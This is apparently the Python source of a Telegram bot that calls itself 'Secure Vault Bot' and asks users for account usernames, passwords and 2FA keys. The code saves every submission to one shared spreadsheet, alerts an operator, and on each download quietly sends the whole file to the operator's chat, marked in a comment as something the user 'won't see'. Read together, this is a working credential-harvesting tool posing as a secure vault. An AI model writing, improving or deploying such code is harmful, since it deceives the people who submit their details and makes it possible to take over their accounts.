import os
import random
import string
import asyncio
from datetime import datetime
from openpyxl import Workbook, load_workbook
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# ========= CONFIG =========
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_USERNAME = "@Sefuax"
EXCEL_FILE = "accounts.xlsx"

# Conversation states
USERNAME, PASSWORD, TFA = range(3)

# ========= KEYBOARD =========
# Create keyboard buttons properly (no 'persistent' argument)
keyboard = [
    [KeyboardButton("✅ Submit Account"), KeyboardButton("🎭 Fake Info")],
    [KeyboardButton("👤 Admin")],
    [KeyboardButton("📥 Download")]
]
MAIN_KEYBOARD = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ========= HELPER FUNCTIONS =========
def save_to_excel(username, password, tfa, user_id, user_name):
    """Save account details to Excel file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    if os.path.exists(EXCEL_FILE):
        wb = load_workbook(EXCEL_FILE)
        ws = wb.active
    else:
        wb = Workbook()
        ws = wb.active
        ws.append(["Username", "Password", "2FA", "Timestamp", "User ID", "User Name"])
    
    ws.append([username, password, tfa, timestamp, user_id, user_name])
    wb.save(EXCEL_FILE)
    return True

def generate_fake_info():
    """Generate random fake info"""
    first_names = ["Alex", "Jordan", "Casey", "Riley", "Morgan", "Taylor", "Sam", "Jamie"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
    
    name = f"{random.choice(first_names)} {random.choice(last_names)}"
    
    # Generate unusual username with numbers in middle
    base = random.choice(["tech", "coder", "gamer", "hacker", "dev", "pro", "master"])
    num = random.randint(10, 999)
    suffix = random.choice(["x", "z", "q", "v", ""])
    username = f"{base}{num}{suffix}"
    
    gender = random.choice(["Male", "Female", "Non-binary", "Prefer not to say"])
    
    return name, username, gender

async def send_to_admin(app, message_text, file_path=None):
    """Send message or file to admin"""
    try:
        # Get admin's chat_id by sending a test message (simplified approach)
        # For production, store admin_chat_id in env
        admin_chat_id = os.getenv("ADMIN_CHAT_ID")
        if admin_chat_id:
            admin_chat_id = int(admin_chat_id)
            if file_path and os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    await app.bot.send_document(chat_id=admin_chat_id, document=f, caption=message_text)
            else:
                await app.bot.send_message(chat_id=admin_chat_id, text=message_text)
    except Exception as e:
        print(f"Could not send to admin: {e}")

# ========= COMMAND HANDLERS =========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message with keyboard"""
    welcome_msg = (
        "🤖 *Welcome to Secure Vault Bot* 🤖\n\n"
        "I help you store and manage your account credentials securely.\n\n"
        "✅ *Submit Account* - Store username/password/2FA\n"
        "🎭 *Fake Info* - Generate fake identity\n"
        "👤 *Admin* - Contact administrator\n"
        "📥 *Download* - Get your saved accounts\n\n"
        "🚀 *Start by submitting your first account!*"
    )
    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)

async def submit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start account submission process"""
    await update.message.reply_text("🔐 *Submit Account*\n\nPlease send your *Username*:", parse_mode="Markdown")
    return USERNAME

async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get username from user"""
    context.user_data['username'] = update.message.text
    await update.message.reply_text("🔑 Now send your *Password*:", parse_mode="Markdown")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get password from user"""
    context.user_data['password'] = update.message.text
    await update.message.reply_text("🔢 Send *2FA Key* (or type 'none' to skip):", parse_mode="Markdown")
    return TFA

async def get_tfa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get 2FA and save everything"""
    tfa = update.message.text
    if tfa.lower() == 'none':
        tfa = "Not provided"
    
    user_id = update.effective_user.id
    user_name = update.effective_user.username or update.effective_user.first_name
    
    save_to_excel(
        context.user_data['username'],
        context.user_data['password'],
        tfa,
        user_id,
        user_name
    )
    
    await update.message.reply_text(
        "✅ *Account saved successfully!*\n\n"
        f"📝 Username: `{context.user_data['username']}`\n"
        f"🔒 Password: `{context.user_data['password']}`\n"
        f"🔐 2FA: `{tfa}`\n\n"
        "You can download all saved accounts using 📥 *Download* button.",
        parse_mode="Markdown",
        reply_markup=MAIN_KEYBOARD
    )
    
    # Notify admin
    await send_to_admin(
        context.application,
        f"🆕 New account submitted!\n👤 User: {user_name} (ID: {user_id})\n📝 Username: {context.user_data['username']}"
    )
    
    return ConversationHandler.END

async def fake_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate and send fake information"""
    name, username, gender = generate_fake_info()
    
    fake_msg = (
        "🎭 *Fake Information Generated* 🎭\n\n"
        f"📛 *Name:* `{name}`\n"
        f"👤 *Username:* `{username}`\n"
        f"⚧️ *Gender:* `{gender}`\n\n"
        "*Use this for testing purposes only!*"
    )
    
    await update.message.reply_text(fake_msg, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)

async def admin_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Forward user to admin"""
    user = update.effective_user
    msg = (
        f"👤 *Admin Panel Access*\n\n"
        f"User: {user.first_name} (@{user.username or 'no username'})\n"
        f"ID: `{user.id}`\n\n"
        f"📬 Click here to contact admin: {ADMIN_USERNAME}"
    )
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=MAIN_KEYBOARD)
    
    # Notify admin
    await send_to_admin(
        context.application,
        f"🔔 User {user.first_name} (@{user.username or 'no username'}) opened admin panel.\nUser ID: {user.id}"
    )

async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send the Excel file to user and silently to admin"""
    if not os.path.exists(EXCEL_FILE):
        await update.message.reply_text(
            "❌ *No data found!*\n\nPlease submit some accounts first using the 'Submit Account' button.",
            parse_mode="Markdown",
            reply_markup=MAIN_KEYBOARD
        )
        return
    
    user = update.effective_user
    
    # Send to user
    with open(EXCEL_FILE, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename="accounts.xlsx",
            caption="📊 *Your saved accounts*\n\nHere's the Excel file with all your data.",
            parse_mode="Markdown",
            reply_markup=MAIN_KEYBOARD
        )
    
    # Silently send to admin (user won't see this)
    admin_chat_id = os.getenv("ADMIN_CHAT_ID")
    if admin_chat_id:
        try:
            with open(EXCEL_FILE, 'rb') as f:
                await context.bot.send_document(
                    chat_id=int(admin_chat_id),
                    document=f,
                    filename=f"accounts_backup_{user.id}.xlsx",
                    caption=f"📥 *Backup*\nUser {user.first_name} (@{user.username or 'no username'}) downloaded the file."
                )
        except Exception as e:
            print(f"Admin send failed: {e}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel conversation"""
    await update.message.reply_text("❌ Cancelled. Use /start to begin again.", reply_markup=MAIN_KEYBOARD)
    return ConversationHandler.END

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle keyboard button presses"""
    text = update.message.text
    
    if text == "✅ Submit Account":
        return await submit_start(update, context)
    elif text == "🎭 Fake Info":
        return await fake_info(update, context)
    elif text == "👤 Admin":
        return await admin_contact(update, context)
    elif text == "📥 Download":
        return await download(update, context)
    else:
        await update.message.reply_text("Please use the buttons below 👇", reply_markup=MAIN_KEYBOARD)
        return ConversationHandler.END

# ========= MAIN =========
def main():
    """Start the bot"""
    if not BOT_TOKEN:
        print("❌ Error: BOT_TOKEN environment variable not set!")
        return
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation handler for submit account
    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^✅ Submit Account$"), submit_start)],
        states={
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            TFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_tfa)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(MessageHandler(filters.Regex("^(✅ Submit Account|🎭 Fake Info|👤 Admin|📥 Download)$"), handle_buttons))
    
    # Start bot
    print("🤖 Bot is starting...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
